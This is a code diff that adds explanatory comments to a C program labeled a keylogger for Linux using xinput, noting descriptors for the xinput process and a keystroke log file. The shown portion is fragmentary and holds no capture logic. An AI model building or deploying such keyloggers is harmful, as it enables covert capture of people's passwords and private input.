@@ -1,3 +1,7 @@
+/* A Keylogger program for linux platforms */
+
+/* Dependancies : xinput */
+
 #include<stdio.h>
 #include<string.h>
 #include<signal.h>
@@ -5,9 +9,10 @@
 
 #define SIZE 16
 
-FILE *fp1 = NULL;
-FILE *fp2 = NULL;
+FILE *fp1 = NULL; //process descriptor for xinput
+FILE *fp2 = NULL; //file descriptor to write keystrokes
 
+//Wrap up file desciptor and process descriptor
 static void catchInt(int signo)
 {
   fclose(fp1);
@@ -21,7 +26,7 @@ int main(int argc, char *argv[])
   int key=0;
   char buffer[SIZE];
 
-  signal(SIGINT, catchInt);
+  signal(SIGINT, catchInt); //waiting for the interruption and invokes catchInt
 
   if(argc!=2)
     goto exit;
